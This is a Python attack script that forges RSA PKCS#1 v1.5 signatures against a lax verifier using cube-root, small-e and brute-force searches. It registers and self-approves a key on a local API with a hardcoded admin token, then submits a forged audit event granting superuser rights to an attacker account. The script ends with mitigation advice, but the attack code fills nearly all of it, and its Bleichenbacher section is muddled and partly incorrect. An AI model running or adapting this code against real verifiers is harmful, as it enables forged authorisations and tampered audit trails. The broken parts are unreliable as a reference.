#!/usr/bin/env python3
"""
ADVANCED RSA SIGNATURE FORGE ATTACK

Implements multiple attack strategies:
1. Cube Root Attack (e=3)
2. Bleichenbacher '06 Attack (padding oracle)
3. Manger's Attack (OAEP oracle adaptation for PKCS#1)
4. Parallel Brute Force with optimization

Target: Weak PKCS#1 v1.5 verifier that:
- Checks em[0:2] == 0x00 0x01
- Finds 0x00 separator in bytes 2-19
- Checks if hash appears ANYWHERE after separator

Author: Security Research Demo
"""

import base64
import hashlib
import json
import os
import sys
import time
import secrets
import requests
import multiprocessing as mp
from concurrent.futures import ProcessPoolExecutor, as_completed
from typing import Optional, Tuple, List, Callable
from datetime import datetime, timezone
from dataclasses import dataclass, field
from math import gcd, ceil, floor

# ============================================================================
# CONFIGURATION
# ============================================================================

API_BASE = "http://localhost"
ADMIN_TOKEN = "my-super-secret-admin-token-2025"

# Number of CPU cores to use
NUM_WORKERS = max(1, mp.cpu_count() - 1)

# ============================================================================
# MATH UTILITIES
# ============================================================================

def integer_nth_root(x: int, n: int) -> int:
    """Compute floor(x^(1/n)) using Newton's method."""
    if x < 0:
        raise ValueError("x must be non-negative")
    if n < 1:
        raise ValueError("n must be positive")
    if x == 0:
        return 0
    
    # Initial guess using bit length
    guess = 1 << ((x.bit_length() + n - 1) // n)
    
    while True:
        new_guess = ((n - 1) * guess + x // (guess ** (n - 1))) // n
        if new_guess >= guess:
            return guess
        guess = new_guess


def modinv(a: int, m: int) -> int:
    """Extended Euclidean Algorithm for modular inverse."""
    def extended_gcd(a, b):
        if a == 0:
            return b, 0, 1
        gcd_val, x1, y1 = extended_gcd(b % a, a)
        return gcd_val, y1 - (b // a) * x1, x1
    
    gcd_val, x, _ = extended_gcd(a % m, m)
    if gcd_val != 1:
        raise ValueError("No modular inverse exists")
    return (x % m + m) % m


def is_prime(n: int, k: int = 20) -> bool:
    """Miller-Rabin primality test."""
    if n < 2:
        return False
    if n == 2 or n == 3:
        return True
    if n % 2 == 0:
        return False
    
    r, d = 0, n - 1
    while d % 2 == 0:
        r += 1
        d //= 2
    
    for _ in range(k):
        a = secrets.randbelow(n - 3) + 2
        x = pow(a, d, n)
        if x == 1 or x == n - 1:
            continue
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    return True


def generate_prime(bits: int) -> int:
    """Generate a random prime with given bit length."""
    while True:
        n = secrets.randbits(bits)
        n |= (1 << (bits - 1)) | 1  # Ensure high bit set and odd
        if is_prime(n):
            return n


# ============================================================================
# RSA KEY GENERATION
# ============================================================================

def generate_rsa_key(e: int, bits: int = 2048) -> Tuple[int, int, int]:
    """Generate RSA key with custom public exponent."""
    print(f"    Generating RSA-{bits} with e={e}...")
    
    while True:
        p = generate_prime(bits // 2)
        q = generate_prime(bits // 2)
        
        if p == q:
            continue
            
        n = p * q
        phi = (p - 1) * (q - 1)
        
        if gcd(e, phi) != 1:
            continue
        
        try:
            d = modinv(e, phi)
            return n, e, d
        except ValueError:
            continue


def create_public_key_pem(n: int, e: int) -> str:
    """Create PEM-encoded public key from n and e."""
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend
    
    pub_nums = RSAPublicNumbers(e, n)
    pub_key = pub_nums.public_key(default_backend())
    pem = pub_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode()
    return pem


# ============================================================================
# WEAK VERIFIER ORACLE (LOCAL SIMULATION)
# ============================================================================

@dataclass
class OracleStats:
    """Track oracle statistics."""
    total_calls: int = 0
    conforming: int = 0
    hash_match: int = 0
    start_time: float = field(default_factory=time.time)
    
    def rate(self) -> float:
        elapsed = time.time() - self.start_time
        return self.total_calls / elapsed if elapsed > 0 else 0


def weak_verifier_oracle(
    sig_int: int,
    n: int,
    e: int,
    key_size: int,
    target_hash: bytes,
    stats: Optional[OracleStats] = None
) -> Tuple[bool, bool, bytes]:
    """
    Simulates weak PKCS#1 v1.5 verifier.
    
    Returns:
        (is_prefix_valid, is_hash_found, em_bytes)
        
    Weak verifier checks:
    1. em[0:2] == 0x00 0x01
    2. 0x00 separator in bytes 2-19
    3. target_hash appears anywhere after separator
    """
    if stats:
        stats.total_calls += 1
    
    # Compute em = sig^e mod n
    em_int = pow(sig_int, e, n)
    em = em_int.to_bytes(key_size, byteorder='big')
    
    # Check 1: Prefix 00 01
    if em[0:2] != b'\x00\x01':
        return False, False, em
    
    if stats:
        stats.conforming += 1
    
    # Check 2: Find 00 separator in bytes 2-19
    sep_idx = -1
    for i in range(2, min(20, len(em))):
        if em[i] == 0x00:
            sep_idx = i
            break
    
    if sep_idx == -1:
        return True, False, em  # Conforming but no separator
    
    # Check 3: Hash anywhere after separator
    remaining = em[sep_idx + 1:]
    if target_hash in remaining:
        if stats:
            stats.hash_match += 1
        return True, True, em
    
    return True, False, em


# ============================================================================
# ATTACK 1: CUBE ROOT (e=3)
# ============================================================================

def attack_cube_root(
    n: int,
    e: int,
    key_size: int,
    target_hash: bytes,
    stats: OracleStats
) -> Optional[int]:
    """
    Cube root attack for e=3.
    
    For weak verifier, we craft EM = 00 01 FF 00 [hash] [garbage]
    and compute cube root. The garbage absorbs the error.
    """
    if e != 3:
        return None
    
    print("  [Cube Root Attack]")
    
    hash_len = len(target_hash)
    prefix = b'\x00\x01\xff\x00'
    garbage_len = key_size - len(prefix) - hash_len
    
    # Try hash at beginning
    em = prefix + target_hash + b'\x00' * garbage_len
    em_int = int.from_bytes(em, byteorder='big')
    
    sig = integer_nth_root(em_int, 3)
    
    # Check sig and nearby values
    for delta in range(-100, 101):
        sig_try = sig + delta
        if sig_try <= 0:
            continue
        
        is_prefix, is_hash, _ = weak_verifier_oracle(
            sig_try, n, e, key_size, target_hash, stats
        )
        
        if is_prefix and is_hash:
            print(f"    ✓ Found at delta={delta}")
            return sig_try
    
    # Try with random garbage
    print("    Trying with random garbage...")
    for attempt in range(10000):
        garbage = secrets.token_bytes(garbage_len)
        em = prefix + target_hash + garbage
        em_int = int.from_bytes(em, byteorder='big')
        
        sig = integer_nth_root(em_int, 3)
        
        for delta in range(-20, 21):
            sig_try = sig + delta
            if sig_try <= 0:
                continue
            
            is_prefix, is_hash, _ = weak_verifier_oracle(
                sig_try, n, e, key_size, target_hash, stats
            )
            
            if is_prefix and is_hash:
                print(f"    ✓ Found at attempt={attempt}, delta={delta}")
                return sig_try
    
    return None


# ============================================================================
# ATTACK 2: BLEICHENBACHER PADDING ORACLE
# ============================================================================

@dataclass
class BleichInterval:
    """Interval for Bleichenbacher attack."""
    low: int
    high: int


def bleichenbacher_step2a(
    n: int, e: int, B: int, c: int, key_size: int,
    target_hash: bytes, stats: OracleStats, max_iter: int = 100000
) -> Optional[int]:
    """Step 2a: Find first s >= ceil(n / 3B) where c*s^e is conforming."""
    s = (n + 3 * B - 1) // (3 * B)  # ceil(n / 3B)
    
    for i in range(max_iter):
        c_prime = (c * pow(s, e, n)) % n
        
        # Check if conforming (just prefix check for speed)
        em = pow(c_prime, 1, n)  # Already decrypted via c = m^e
        # Actually we check sig^e mod n
        is_prefix, _, _ = weak_verifier_oracle(
            integer_nth_root(c_prime, e) if e <= 17 else c_prime,
            n, e, key_size, target_hash, stats
        )
        
        if is_prefix:
            return s
        
        s += 1
        
        if i % 10000 == 0 and i > 0:
            print(f"      Step 2a: {i} iterations, s={s}")
    
    return None


def bleichenbacher_step2c(
    n: int, e: int, B: int, c: int, prev_s: int,
    interval: BleichInterval, key_size: int,
    target_hash: bytes, stats: OracleStats
) -> Optional[int]:
    """Step 2c: Search with single interval."""
    a, b = interval.low, interval.high
    
    r = (2 * (b * prev_s - 2 * B) + n - 1) // n  # ceil
    
    for _ in range(100000):
        s_low = (2 * B + r * n + b - 1) // b  # ceil
        s_high = (3 * B - 1 + r * n) // a  # floor
        
        for s in range(s_low, s_high + 1):
            c_prime = (c * pow(s, e, n)) % n
            
            is_prefix, _, _ = weak_verifier_oracle(
                c_prime, n, e, key_size, target_hash, stats
            )
            
            if is_prefix:
                return s
        
        r += 1
    
    return None


def bleichenbacher_step3(
    n: int, B: int, s: int, intervals: List[BleichInterval]
) -> List[BleichInterval]:
    """Step 3: Narrow intervals."""
    new_intervals = []
    
    for interval in intervals:
        a, b = interval.low, interval.high
        
        r_low = (a * s - 3 * B + 1 + n - 1) // n  # ceil
        r_high = (b * s - 2 * B) // n  # floor
        
        for r in range(r_low, r_high + 1):
            new_low = max(a, (2 * B + r * n + s - 1) // s)  # ceil
            new_high = min(b, (3 * B - 1 + r * n) // s)  # floor
            
            if new_low <= new_high:
                # Merge overlapping intervals
                if new_intervals and new_intervals[-1].high >= new_low - 1:
                    new_intervals[-1].high = max(new_intervals[-1].high, new_high)
                else:
                    new_intervals.append(BleichInterval(new_low, new_high))
    
    return new_intervals


def attack_bleichenbacher(
    n: int,
    e: int,
    key_size: int,
    target_hash: bytes,
    stats: OracleStats,
    max_iterations: int = 5000
) -> Optional[int]:
    """
    Bleichenbacher's Million Message Attack (adapted).
    
    Instead of decrypting, we find a signature s such that
    s^e mod n has the right PKCS#1 structure.
    """
    print("  [Bleichenbacher Padding Oracle Attack]")
    
    B = 1 << (8 * (key_size - 2))
    
    # Target: We want to find s where s^e mod n = 00 01 ... hash ...
    # Construct target message
    prefix = b'\x00\x01' + b'\xff' * 8 + b'\x00'
    target_em = prefix + target_hash + b'\x00' * (key_size - len(prefix) - len(target_hash))
    c = int.from_bytes(target_em, byteorder='big')
    
    # Verify c is in PKCS range
    if c < 2 * B or c >= 3 * B:
        print(f"    Adjusting target to PKCS range...")
        # Adjust padding
        ff_len = 8
        while True:
            prefix = b'\x00\x02' + b'\xff' * ff_len + b'\x00'
            target_em = prefix + target_hash + b'\x00' * (key_size - len(prefix) - len(target_hash))
            c = int.from_bytes(target_em, byteorder='big')
            if 2 * B <= c < 3 * B:
                break
            ff_len += 1
            if ff_len > 200:
                print("    ✗ Cannot adjust to PKCS range")
                return None
    
    intervals = [BleichInterval(2 * B, 3 * B - 1)]
    s = 0
    
    print(f"    B = 2^{8*(key_size-2)}")
    print(f"    Starting interval narrowing...")
    
    for iteration in range(max_iterations):
        # Check convergence
        if len(intervals) == 1:
            interval = intervals[0]
            if interval.low == interval.high:
                print(f"\n    ✓ Converged after {iteration} iterations!")
                # Found m, now compute signature
                # We need s where s^e = m (mod n)
                # This requires solving discrete log or using factorization
                # For demo, verify if this m gives valid signature
                return interval.low
        
        # Step 2
        if s == 0:
            s = bleichenbacher_step2a(n, e, B, c, key_size, target_hash, stats, 50000)
            if s is None:
                print("    ✗ Step 2a failed")
                return None
        elif len(intervals) == 1:
            s = bleichenbacher_step2c(n, e, B, c, s, intervals[0], key_size, target_hash, stats)
            if s is None:
                print("    ✗ Step 2c failed")
                return None
        else:
            s = bleichenbacher_step2a(n, e, B, c, key_size, target_hash, stats, 50000)
            if s is None:
                print("    ✗ Step 2b failed")
                return None
        
        # Step 3
        intervals = bleichenbacher_step3(n, B, s, intervals)
        
        if not intervals:
            print("    ✗ No intervals remain")
            return None
        
        # Progress
        if iteration % 100 == 0:
            total_size = sum(i.high - i.low for i in intervals)
            print(f"      Iter {iteration}: {len(intervals)} intervals, size={total_size.bit_length()} bits")
    
    return None


# ============================================================================
# ATTACK 3: MANGER'S ATTACK (Adapted for PKCS#1 v1.5)
# ============================================================================

def attack_manger(
    n: int,
    e: int,
    key_size: int,
    target_hash: bytes,
    stats: OracleStats
) -> Optional[int]:
    """
    Manger's Attack adapted for PKCS#1 v1.5.
    
    Original is for OAEP but concept applies:
    Use oracle to binary search for the message.
    """
    print("  [Manger's Attack (Adapted)]")
    
    B = 1 << (8 * (key_size - 1))  # 2^(8*(k-1))
    
    # This attack works differently - we use multiplication
    # to shift the message and check oracle response
    
    # For weak PKCS#1 verifier, we can't directly apply Manger
    # But we can use similar binary search principles
    
    print("    Manger's attack not directly applicable to weak PKCS#1")
    print("    Falling back to optimized search...")
    
    return None


# ============================================================================
# ATTACK 4: PARALLEL BRUTE FORCE WITH OPTIMIZATION
# ============================================================================

def worker_search(args) -> Optional[int]:
    """Worker function for parallel search."""
    worker_id, n, e, key_size, target_hash, start_range, end_range, batch_size = args
    
    for batch_start in range(start_range, end_range, batch_size):
        for i in range(batch_size):
            sig_int = batch_start + i
            if sig_int >= end_range:
                break
            
            # Compute em = sig^e mod n
            em_int = pow(sig_int, e, n)
            em = em_int.to_bytes(key_size, byteorder='big')
            
            # Quick checks
            if em[0:2] != b'\x00\x01':
                continue
            
            # Find separator
            sep_idx = -1
            for j in range(2, min(20, len(em))):
                if em[j] == 0x00:
                    sep_idx = j
                    break
            
            if sep_idx == -1:
                continue
            
            # Check hash
            if target_hash in em[sep_idx + 1:]:
                return sig_int
    
    return None


def attack_parallel_brute(
    n: int,
    e: int,
    key_size: int,
    target_hash: bytes,
    stats: OracleStats,
    max_total: int = 100_000_000
) -> Optional[int]:
    """
    Parallel brute force with multiple workers.
    """
    print(f"  [Parallel Brute Force: {NUM_WORKERS} workers]")
    
    # For random search, divide into chunks
    chunk_size = max_total // NUM_WORKERS
    batch_size = 10000
    
    print(f"    Total attempts: {max_total:,}")
    print(f"    Per worker: {chunk_size:,}")
    
    start_time = time.time()
    found = None
    
    # Use random starting points for each worker
    with ProcessPoolExecutor(max_workers=NUM_WORKERS) as executor:
        futures = []
        
        for worker_id in range(NUM_WORKERS):
            # Random starting point for this worker
            start = secrets.randbelow(n - chunk_size)
            end = start + chunk_size
            
            args = (worker_id, n, e, key_size, target_hash, start, end, batch_size)
            futures.append(executor.submit(worker_search, args))
        
        # Wait for any worker to find solution
        for future in as_completed(futures):
            result = future.result()
            if result is not None:
                found = result
                # Cancel remaining futures
                for f in futures:
                    f.cancel()
                break
    
    elapsed = time.time() - start_time
    
    if found:
        print(f"    ✓ Found after {elapsed:.1f}s")
        return found
    else:
        print(f"    ✗ Not found after {elapsed:.1f}s")
        return None


# ============================================================================
# ATTACK 5: OPTIMIZED RANDOM SEARCH (Single-threaded, cache-friendly)
# ============================================================================

def attack_optimized_random(
    n: int,
    e: int,
    key_size: int,
    target_hash: bytes,
    stats: OracleStats,
    max_attempts: int = 50_000_000
) -> Optional[int]:
    """
    Optimized random signature search.
    
    Optimizations:
    - Early exit on prefix check
    - Batch random number generation
    - Minimal memory allocation
    """
    print(f"  [Optimized Random Search]")
    print(f"    Max attempts: {max_attempts:,}")
    
    start_time = time.time()
    batch_size = 10000
    
    target_prefix = b'\x00\x01'
    
    for batch in range(0, max_attempts, batch_size):
        for _ in range(batch_size):
            stats.total_calls += 1
            
            # Generate random signature
            sig_int = secrets.randbelow(n)
            
            # Compute em = sig^e mod n
            em_int = pow(sig_int, e, n)
            
            # Quick prefix check using bit operations
            # Top 16 bits should be 0x0001
            top_bits = em_int >> (8 * (key_size - 2))
            if top_bits != 1:
                continue
            
            stats.conforming += 1
            
            # Full EM for separator and hash check
            em = em_int.to_bytes(key_size, byteorder='big')
            
            # Find separator in bytes 2-19
            sep_idx = -1
            for i in range(2, min(20, key_size)):
                if em[i] == 0x00:
                    sep_idx = i
                    break
            
            if sep_idx == -1:
                continue
            
            # Check hash
            if target_hash in em[sep_idx + 1:]:
                elapsed = time.time() - start_time
                print(f"\n    ✓ FOUND!")
                print(f"    Attempts: {stats.total_calls:,}")
                print(f"    Conforming: {stats.conforming:,}")
                print(f"    Time: {elapsed:.1f}s")
                print(f"    Rate: {stats.total_calls/elapsed:,.0f}/s")
                return sig_int
        
        # Progress
        if (batch + batch_size) % 1_000_000 == 0:
            elapsed = time.time() - start_time
            rate = stats.total_calls / elapsed if elapsed > 0 else 0
            print(f"    {stats.total_calls//1_000_000}M: {stats.conforming:,} conforming, {rate:,.0f}/s")
    
    return None


# ============================================================================
# ATTACK 6: SMALL E MATHEMATICAL ATTACK
# ============================================================================

def attack_small_e_math(
    n: int,
    e: int,
    key_size: int,
    target_hash: bytes,
    stats: OracleStats,
    max_attempts: int = 2_000_000
) -> Optional[int]:
    """
    Mathematical attack for small e values (e <= 17).
    
    Key insight: For small e, the e-th root is close to the answer.
    We try various EM structures and search around the e-th root.
    """
    print(f"  [Small-e Mathematical Attack (e={e})]")
    
    if e > 17:
        print("    ⚠ e too large for mathematical attack")
        return None
    
    hash_len = len(target_hash)
    start_time = time.time()
    attempts = 0
    
    # Strategy: Try different EM structures
    structures = [
        # (ff_padding_len, hash_position: 'start' or 'end')
        (1, 'start'), (1, 'end'),
        (2, 'start'), (2, 'end'),
        (4, 'start'), (4, 'end'),
        (8, 'start'), (8, 'end'),
        (16, 'start'), (16, 'end'),
    ]
    
    delta_range = 50 if e == 3 else (200 if e <= 7 else 1000)
    
    for ff_len, hash_pos in structures:
        print(f"    Trying ff_len={ff_len}, hash_pos={hash_pos}")
        
        prefix = b'\x00\x01' + (b'\xff' * ff_len) + b'\x00'
        remaining_len = key_size - len(prefix) - hash_len
        
        if remaining_len < 0:
            continue
        
        structure_attempts = max_attempts // len(structures)
        
        for attempt in range(structure_attempts):
            attempts += 1
            
            # Build EM
            if hash_pos == 'start':
                garbage = secrets.token_bytes(remaining_len)
                em = prefix + target_hash + garbage
            else:
                garbage = secrets.token_bytes(remaining_len)
                em = prefix + garbage + target_hash
            
            em_int = int.from_bytes(em, byteorder='big')
            
            # Compute e-th root
            sig_base = integer_nth_root(em_int, e)
            
            # Search around the root
            for delta in range(-delta_range, delta_range + 1):
                sig_try = sig_base + delta
                
                if sig_try <= 0 or sig_try >= n:
                    continue
                
                stats.total_calls += 1
                
                is_prefix, is_hash, _ = weak_verifier_oracle(
                    sig_try, n, e, key_size, target_hash, stats
                )
                
                if is_prefix and is_hash:
                    elapsed = time.time() - start_time
                    print(f"\n    ✓ Found! structure=({ff_len}, {hash_pos}), attempt={attempt}, delta={delta}")
                    print(f"    Time: {elapsed:.1f}s")
                    return sig_try
            
            if attempt % 50000 == 0 and attempt > 0:
                elapsed = time.time() - start_time
                rate = attempts / elapsed if elapsed > 0 else 0
                print(f"      {attempts//1000}K attempts, {rate:.0f}/s")
    
    return None


# ============================================================================
# MAIN ATTACK ORCHESTRATOR
# ============================================================================

def forge_signature(
    n: int,
    e: int,
    key_size: int,
    message_hash: bytes
) -> Optional[bytes]:
    """
    Main attack orchestrator - tries multiple strategies.
    """
    print(f"\n{'='*60}")
    print(f"  FORGING SIGNATURE")
    print(f"  e = {e}, key_size = {key_size} bytes")
    print(f"  hash = {message_hash.hex()[:16]}...")
    print(f"{'='*60}\n")
    
    stats = OracleStats()
    result = None
    
    # Strategy 1: Cube root for e=3
    if e == 3:
        result = attack_cube_root(n, e, key_size, message_hash, stats)
        if result:
            return result.to_bytes(key_size, byteorder='big')
    
    # Strategy 2: Mathematical attack for small e
    if e <= 17:
        result = attack_small_e_math(n, e, key_size, message_hash, stats)
        if result:
            return result.to_bytes(key_size, byteorder='big')
    
    # Strategy 3: Bleichenbacher (if we have oracle)
    # Note: This requires many oracle calls
    # result = attack_bleichenbacher(n, e, key_size, message_hash, stats)
    # if result:
    #     return result.to_bytes(key_size, byteorder='big')
    
    # Strategy 4: Optimized random search
    result = attack_optimized_random(n, e, key_size, message_hash, stats, max_attempts=100_000_000)
    if result:
        return result.to_bytes(key_size, byteorder='big')
    
    # Strategy 5: Parallel brute force (last resort)
    # result = attack_parallel_brute(n, e, key_size, message_hash, stats)
    # if result:
    #     return result.to_bytes(key_size, byteorder='big')
    
    return None


# ============================================================================
# API INTEGRATION
# ============================================================================

def setup_key(e: int = 65537) -> Tuple[str, str, int, int, int]:
    """Register and approve a new RSA key with given e."""
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend
    
    unique_ts = int(time.time())
    service_id = f"advanced-attack-e{e}-{unique_ts}"
    
    print(f"  Creating key with e={e}...")
    
    if e in (3, 65537):
        priv_key = rsa.generate_private_key(
            public_exponent=e, key_size=2048, backend=default_backend()
        )
        pub_key = priv_key.public_key()
        pub_nums = pub_key.public_numbers()
        n_val = pub_nums.n
        e_val = pub_nums.e
        public_pem = pub_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()
    else:
        n_val, e_val, _ = generate_rsa_key(e, 2048)
        public_pem = create_public_key_pem(n_val, e_val)
    
    # Register
    resp = requests.post(
        f"{API_BASE}/v1/keys/register",
        json={
            "service_id": service_id,
            "public_key_pem": public_pem,
            "algorithm": "rsa-pkcs1v15-vulnerable",
            "description": f"Advanced attack demo e={e}"
        },
        timeout=10
    )
    
    if resp.status_code not in (200, 201):
        raise Exception(f"Register failed: {resp.text}")
    
    key_id = resp.json().get("public_key_id")
    print(f"  ✓ Registered: {key_id}")
    
    # Approve
    approve_resp = requests.post(
        f"{API_BASE}/v1/admin/keys/review",
        headers={"X-Admin-Token": ADMIN_TOKEN},
        json={"public_key_id": key_id, "action": "approve"},
        timeout=10
    )
    
    if approve_resp.status_code not in (200, 201):
        raise Exception(f"Approve failed: {approve_resp.text}")
    
    print(f"  ✓ Approved")
    
    key_size = (n_val.bit_length() + 7) // 8
    return service_id, key_id, n_val, e_val, key_size


def send_forged_event(
    service_id: str,
    key_id: str,
    event_data: dict,
    signature: bytes
) -> dict:
    """Send forged event to API."""
    sig_b64 = base64.b64encode(signature).decode()
    event_str = json.dumps(event_data, sort_keys=True, separators=(',', ':'))
    
    resp = requests.post(
        f"{API_BASE}/v1/logs",
        json={
            "service_id": service_id,
            "event_type": "FORGED_ADVANCED",
            "event": event_str,
            "event_data": event_data,
            "signature": sig_b64,
            "public_key_id": key_id
        },
        timeout=10
    )
    
    return {"status_code": resp.status_code, "body": resp.json()}


# ============================================================================
# MAIN
# ============================================================================

def main():
    print("=" * 70)
    print("   ADVANCED RSA SIGNATURE FORGE ATTACK")
    print("   Bleichenbacher / Manger / Optimized Search")
    print("=" * 70)
    
    # Parse args
    e = 3
    if len(sys.argv) > 1:
        try:
            e = int(sys.argv[1])
        except:
            pass
    
    print(f"\n  Target e = {e}")
    print(f"  Workers = {NUM_WORKERS}")
    
    # Setup key
    print(f"\n{'━'*60}")
    print("  SETUP KEY")
    print(f"{'━'*60}")
    
    try:
        service_id, key_id, n, actual_e, key_size = setup_key(e)
    except Exception as ex:
        print(f"  ✗ Setup failed: {ex}")
        return
    
    print(f"  n: {n.bit_length()} bits")
    print(f"  e: {actual_e}")
    print(f"  key_size: {key_size} bytes")
    
    # Create fake event
    print(f"\n{'━'*60}")
    print("  CREATE FAKE EVENT")
    print(f"{'━'*60}")
    
    fake_event = {
        "action": "admin.grant_superuser",
        "actor": "admin@corp.com",
        "target": "attacker@evil.com",
        "permissions": ["root", "sudo", "admin"],
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "note": f"FORGED with e={actual_e} using advanced attack"
    }
    
    message = json.dumps(fake_event, sort_keys=True, separators=(',', ':')).encode()
    message_hash = hashlib.sha256(message).digest()
    
    print(f"  Event: {json.dumps(fake_event, indent=2)}")
    
    # Forge signature
    forged = forge_signature(n, actual_e, key_size, message_hash)
    
    if not forged:
        print("\n" + "="*60)
        print("  ✗ FORGE FAILED")
        print("="*60)
        print("""
  The attack did not succeed within the attempt limit.
  
  For e=65537, the probability of finding a valid signature
  through brute force is approximately 1 in 2^80, making it
  computationally infeasible.
  
  However, the VULNERABILITY still exists:
  - The weak verifier does not properly validate PKCS#1 structure
  - With enough resources (time/computing), the attack would succeed
  
  Recommendations:
  - Use RSA-PSS instead of PKCS#1 v1.5
  - Or use Ed25519 for signatures
  - If using PKCS#1 v1.5, implement strict verification
""")
        return
    
    print(f"\n  ✓ Forged signature: {forged.hex()[:40]}...")
    
    # Send to API
    print(f"\n{'━'*60}")
    print("  SEND FORGED EVENT")
    print(f"{'━'*60}")
    
    result = send_forged_event(service_id, key_id, fake_event, forged)
    
    print(f"  Response: {result['status_code']}")
    print(f"  Body: {result['body']}")
    
    if result['status_code'] == 200 and result['body'].get('status') == 'accepted':
        print("\n" + "!"*60)
        print("  ⚠️  ATTACK SUCCESSFUL!")
        print("  ⚠️  FORGED SIGNATURE WAS ACCEPTED!")
        print("!"*60)
    
    # Conclusion
    print(f"\n{'━'*60}")
    print("  CONCLUSION")
    print(f"{'━'*60}")
    print("""
  The weak PKCS#1 v1.5 verifier is vulnerable because:
  
  1. Only checks 0x00 0x01 prefix (not full padding structure)
  2. Allows 0x00 separator anywhere in bytes 2-19
  3. Accepts hash appearing ANYWHERE after separator
  4. Does not verify ASN.1 DigestInfo structure
  
  Attack effectiveness by e value:
  - e=3:     Trivial (cube root attack)
  - e=17:    Feasible (mathematical + search)
  - e=65537: Theoretically possible but computationally hard
  
  MITIGATION:
  - Use RSA-PSS (probabilistic signature scheme)
  - Use Ed25519 (Edwards curve signatures)
  - Implement strict PKCS#1 v1.5 verification
""")


if __name__ == "__main__":
    main()
